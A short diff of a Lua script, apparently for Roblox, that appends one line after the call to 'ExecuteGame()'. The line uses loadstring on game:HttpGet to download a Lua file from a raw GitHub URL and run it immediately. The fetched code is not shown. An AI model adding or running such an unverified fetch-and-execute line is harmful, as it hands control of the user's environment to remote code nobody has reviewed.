@@ -33,3 +33,5 @@ local function ExecuteGame()
 end
 
 ExecuteGame()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/Games/Test.lua"))()
